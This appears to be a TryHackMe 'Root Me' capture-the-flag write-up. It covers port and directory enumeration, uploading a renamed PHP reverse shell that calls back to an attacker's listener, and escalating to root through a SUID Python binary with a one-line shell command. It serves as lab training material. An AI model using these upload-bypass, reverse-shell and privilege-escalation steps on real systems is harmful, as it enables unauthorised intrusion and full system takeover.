## Root Me | TryHackMe Write-up

## Introduction

Root Me is an easy-level TryHackMe room designed to introduce the fundamentals of web application penetration testing and Linux privilege escalation. The objective is to gain initial access to the target machine through a vulnerable web application, obtain a user shell, and escalate privileges to root by identifying and exploiting a misconfigured system binary.

This walkthrough documents the methodology I followed, the tools used, and the reasoning behind each step—from reconnaissance and web enumeration to exploitation and privilege escalation—to successfully capture both the user and root flags.

## Task 1 – Deploy the Machine

Once the target machine is deployed, only the IP address is provided. With no prior knowledge of the environment, the first step is to perform reconnaissance to discover the exposed services, identify open ports, and gather information that can be used in the later stages of the assessment.

<img width="1702" height="556" alt="image" src="https://github.com/user-attachments/assets/3a3cb2ba-cdf1-47c5-90b4-bb88d8e43814" />

With only the target IP address available, the first step is to perform reconnaissance to identify open ports and running services.

## Task 2 – Reconnaissance

I began by scanning the target using Nmap with the following command:

```bash
nmap -sC -sV <TARGET_IP>
```

Explanation:

-sC – Executes Nmap's default NSE scripts.
-sV – Detects the versions of the running services.

The scan revealed two open ports:

22/tcp – SSH
80/tcp – Apache HTTP Server (Apache 2.4.29)

The presence of an Apache web server indicates that the web application is likely the primary attack surface, making it the next area to investigate.


<img width="802" height="382" alt="image" src="https://github.com/user-attachments/assets/f828ef18-10f6-4588-9834-89140ddab2ae" />


To discover hidden files and directories hosted by the web server, I performed directory enumeration using Gobuster.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Explanation:

dir – Performs directory brute-forcing.
-u – Specifies the target URL.
-w – Specifies the wordlist to use.

The common.txt wordlist, located at /usr/share/wordlists/dirb/common.txt on Kali Linux, contains commonly used directory and file names, making it suitable for initial enumeration.

The discovered directories provided valuable information about the web application and guided the next stage of the assessment.


<img width="737" height="486" alt="panle" src="https://github.com/user-attachments/assets/d547d456-cc1a-4ed9-9e7e-647b07a44265" />

The enumeration revealed the /panel directory, which contains a file upload functionality.

## Task 3 - Getting a Shell

Step 1: Access the Upload Panel

Open your browser and navigate to:

```bash
http://<TARGET_IP>/panel/
```

You should see a file upload page.


<img width="975" height="587" alt="panel" src="https://github.com/user-attachments/assets/079b70dd-62cb-48af-85e0-7312dc5172ac" />

You can download the PentestMonkey PHP Reverse Shell from the official PentestMonkey website:

PentestMonkey PHP Reverse Shell

Website: http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Alternatively, the PHP reverse shell is also available on the official PentestMonkey GitHub repository.

GitHub: https://github.com/pentestmonkey/php-reverse-shell

Steps: 
Step 1: Visit the PentestMonkey page.
Step 2: Download the php-reverse-shell.php file.

Step 3: Open it in Kali:

       nano php-reverse-shell.php

Step 4: Modify these lines with your Kali/AttackBox IP and the port you want to listen on:

      $ip = 'YOUR_KALI_IP';
      $port = 4444;
      
Step 5: Save the file (Ctrl + O, Enter, Ctrl + X).

Step 6: Rename it to bypass the upload restriction:

      mv php-reverse-shell.php shell.php5

Step 7: Start a Netcat listener:

      nc -lvnp 4444
      
Upload shell.php5 through the /panel/ page and then access it from the /uploads/ directory to receive the reverse shell.

<img width="712" height="605" alt="Screenshot 2026-07-15 191137" src="https://github.com/user-attachments/assets/a8448087-ec51-42a3-b5cd-e71950a7388c" />

After the file is successfully uploaded, navigate to the /uploads directory and click shell.php5 to execute the payload and establish the reverse shell.

<img width="585" height="262" alt="Screenshot 2026-07-15 191212" src="https://github.com/user-attachments/assets/ebbc32e4-bfc8-4ea9-9dbf-121ec685cafb" />


A reverse shell was successfully established, providing initial access to the target machine.

<img width="825" height="210" alt="image" src="https://github.com/user-attachments/assets/23b532e6-bac5-4fd0-973c-3441993220da" />


The user flag was located in the /var/www directory and successfully captured.

<img width="219" height="117" alt="image" src="https://github.com/user-attachments/assets/e040ea68-ca79-4dd5-a2d9-5e7a50928c5e" />

## Task 4 - Privilege Escalation

After obtaining an initial shell, the next objective was to escalate privileges and gain root access.

Enumerating SUID Binaries

A common privilege escalation technique is to search for files with the SUID (Set User ID) permission enabled, as misconfigured SUID binaries can sometimes be exploited to execute commands with elevated privileges.

To enumerate SUID files, I ran:

```bash
find / -perm -u=s -type f 2>/dev/null
```

The output listed several SUID binaries. Among them, /usr/bin/python2.7 stood out as it is known to be exploitable under certain configurations.

<img width="535" height="352" alt="image" src="https://github.com/user-attachments/assets/e24b3dfb-6489-433b-8a84-0ac9ca4e6a6e" />

Exploiting the SUID Python Binary:

To verify whether this binary could be abused, I referred to GTFOBins, a well-known resource that documents legitimate binaries which can be used for privilege escalation when improperly configured.

The following command was used to spawn a shell while preserving elevated privileges:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Upon successful execution, the shell was spawned with root privileges.

To confirm the privilege escalation, I executed:

whoami

Capture the Root Flag

After obtaining root privileges, I navigated to the root user's home directory.

cd /root

List the files:

ls

Output:

root.txt

Finally, display the contents of the root flag.

cat root.txt

The root flag was successfully captured, completing the room.

<img width="729" height="637" alt="image" src="https://github.com/user-attachments/assets/66a54da4-9ac6-448c-ab98-9595607a320e" />



## Conclusion

This room demonstrated the complete penetration testing workflow, starting from reconnaissance and web enumeration to exploiting a vulnerable file upload functionality for initial access. After gaining a foothold on the target, SUID enumeration revealed a misconfigured Python binary that could be leveraged to escalate privileges. By exploiting the SUID-enabled Python executable, root access was obtained and both the user and root flags were successfully captured.

## Key Learnings

- Service enumeration with Nmap
- Directory discovery using Gobuster
- Exploiting insecure file uploads
- Gaining initial access with a PHP reverse shell
- Privilege escalation via SUID binaries
- Leveraging GTFOBins for root access
- Capturing the user and root flags

### HAPPY HACKING! 🚀
